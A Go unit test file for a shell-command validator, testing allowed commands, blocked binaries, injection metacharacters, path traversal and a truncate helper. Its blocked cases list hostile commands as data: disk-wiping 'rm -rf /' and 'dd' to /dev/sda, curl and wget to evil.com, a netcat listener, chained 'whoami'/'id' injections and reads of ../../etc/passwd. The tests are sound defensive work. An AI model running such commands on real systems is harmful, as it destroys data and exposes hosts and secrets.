package main

import (
	"testing"
)

func TestValidateCommand_Allowed(t *testing.T) {
	tests := []struct {
		cmd string
	}{
		{"echo hello world"},
		{"date"},
		{"hostname"},
		{"ls -la /tmp"},
		{"cat /etc/hostname"},
		{"wc -l"},
		{"sort"},
		{"head -n 10 file.txt"},
		{"tail -n 5 file.txt"},
		{"grep pattern file.txt"},
		{"sleep 1"},
	}

	for _, tt := range tests {
		if err := validateCommand(tt.cmd); err != nil {
			t.Errorf("validateCommand(%q) = %v, want nil", tt.cmd, err)
		}
	}
}

func TestValidateCommand_BlockedBinaries(t *testing.T) {
	tests := []struct {
		cmd string
	}{
		{"bash -c 'echo pwned'"},
		{"sh -c 'rm -rf /'"},
		{"python3 -c 'import os'"},
		{"python -c 'import os'"},
		{"rm -rf /"},
		{"curl http://evil.com"},
		{"wget http://evil.com"},
		{"nc -l 4444"},
		{"dd if=/dev/zero of=/dev/sda"},
	}

	for _, tt := range tests {
		if err := validateCommand(tt.cmd); err == nil {
			t.Errorf("validateCommand(%q) = nil, want error", tt.cmd)
		}
	}
}

func TestValidateCommand_BlockedArgs(t *testing.T) {
	tests := []struct {
		cmd     string
		blocked string
	}{
		{"echo hello|world", "|"},
		{"echo hello;whoami", ";"},
		{"echo hello&&id", "&&"},
		{"echo hello||id", "||"},
		{"echo `whoami`", "`"},
		{"echo $(id)", "$("},
		{"grep --exec=cmd pattern", "--exec"},
		{"echo -c something", "-c"},
	}

	for _, tt := range tests {
		err := validateCommand(tt.cmd)
		if err == nil {
			t.Errorf("validateCommand(%q) = nil, want error for blocked pattern %q", tt.cmd, tt.blocked)
		}
	}
}

func TestValidateCommand_PathTraversal(t *testing.T) {
	tests := []string{
		"cat ../../etc/passwd",
		"ls ../../../root",
		"head -n 1 ../../secret.key",
	}

	for _, cmd := range tests {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) = nil, want path traversal error", cmd)
		}
	}
}

func TestValidateCommand_Empty(t *testing.T) {
	if err := validateCommand(""); err == nil {
		t.Error("validateCommand(\"\") = nil, want error")
	}
}

func TestValidateCommand_PathStripped(t *testing.T) {
	// /usr/bin/echo should work because we strip the path
	if err := validateCommand("/usr/bin/echo hello"); err != nil {
		t.Errorf("validateCommand(\"/usr/bin/echo hello\") = %v, want nil", err)
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input string
		max   int
		want  string
	}{
		{"hello", 10, "hello"},
		{"hello world", 5, "hello..."},
		{"", 5, ""},
		{"ab", 2, "ab"},
		{"abc", 2, "ab..."},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.max)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.max, got, tt.want)
		}
	}
}
